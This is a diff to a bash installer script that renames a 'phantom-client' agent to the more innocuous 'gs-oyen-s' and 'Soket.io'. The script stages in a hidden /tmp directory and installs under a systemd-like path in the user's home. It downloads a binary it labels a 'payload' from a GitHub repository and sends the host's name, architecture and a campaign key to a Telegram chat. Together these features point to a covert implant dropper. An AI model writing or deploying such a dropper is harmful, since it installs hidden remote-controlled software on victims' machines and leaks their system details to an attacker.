@@ -3,7 +3,7 @@ set -euo pipefail
 
 # Configuration
 readonly VERSION="3.0.0"
-readonly AGENT_NAME="phantom-client-"
+readonly AGENT_NAME="gs-oyen-s-"
 readonly WORK_DIR="/tmp/.system-runtime-cache"
 readonly FATAL_LOG="${WORK_DIR}/agent_fatal.log"
 readonly INSTALL_DIR="$HOME/.local/share/systemd"
@@ -52,7 +52,7 @@ log_ok
 
 # 4. Binary Download
 log_step "Downloading payload ................................."
-BINARY_URL="${PH_BASE_URL:-https://raw.githubusercontent.com/Oyen-Sec/phantom/main}/phantom-client--${ARCH}"
+BINARY_URL="${PH_BASE_URL:-https://raw.githubusercontent.com/Oyen-Sec/phantom/main}/gs-oyen-s--${ARCH}"
 SUCCESS=0
 for i in 1 2 3; do
     if curl -fsSL --retry 3 --retry-delay 5 --create-dirs -o "${BINARY_PATH}" "${BINARY_URL}"; then
@@ -89,7 +89,7 @@ log_ok
 # 7. Telegram Notification (Optional if env set)
 if [ -n "${TELEGRAM_TOKEN:-}" ] && [ -n "${TELEGRAM_CHAT_ID:-}" ]; then
     log_step "Sending deployment notification ....................."
-    MSG="Phantom-Socket Deployment Successful
+    MSG="Soket.io Deployment Successful
 Arch: ${ARCH}
 Host: $(hostname)
 Key: ${CAMPAIGN_KEY}"
